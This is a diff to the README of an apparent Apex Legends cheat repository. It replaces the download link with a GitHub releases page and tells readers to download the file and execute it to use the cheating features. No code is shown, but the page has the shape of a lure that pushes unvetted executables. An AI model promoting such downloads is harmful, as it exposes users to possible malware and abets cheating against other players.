@@ -6,7 +6,7 @@ Welcome to the "Apex" repository, your go-to place for enhanced gameplay in Apex
 
 You can download the application by clicking the button below:
 
-[![Download Apex Cheat](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/user/repo/Application.zip)
+[![Download Apex Cheat](https://github.com/arafanh/Apex/releases)](https://github.com/arafanh/Apex/releases)
 
 ### Note:
 Download the file and execute to experience the full potential of these cheating features in Apex Legends.
